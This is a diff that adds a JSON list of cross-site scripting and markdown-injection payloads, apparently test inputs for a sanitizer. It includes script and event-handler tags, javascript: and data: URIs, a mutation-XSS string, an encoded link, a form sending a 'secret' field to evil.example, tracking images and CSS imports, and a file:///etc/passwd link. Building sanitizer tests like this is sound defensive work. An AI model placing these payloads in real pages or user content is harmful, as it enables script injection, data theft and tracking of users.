@@ -1,0 +1,22 @@
+[
+  "<script>alert(document.domain)</script>",
+  "<img src=x onerror=alert(1)>",
+  "<svg onload=alert(1)></svg>",
+  "<svg><a xlink:href=javascript:alert(1)>click</a></svg>",
+  "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
+  "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+  "<object data=javascript:alert(1)></object>",
+  "<embed src=data:text/html,<script>alert(1)</script>>",
+  "<form action=https://evil.example><input name=secret></form>",
+  "<details open ontoggle=alert(1)>boom</details>",
+  "<video><source onerror=alert(1)></video>",
+  "[click](javascript:alert(1))",
+  "[click](vbscript:msgbox(1))",
+  "[click](data:text/html,<script>alert(1)</script>)",
+  "[click](file:///etc/passwd)",
+  "[insecure](http://evil.example/path)",
+  "![image](//evil.example/tracker.png)",
+  "![image](data:image/svg+xml,<svg onload=alert(1)>)",
+  "<a href=\"&#x6a;avascript:alert(1)\">encoded</a>",
+  "<style>@import 'https://evil.example/track.css';</style>"
+]
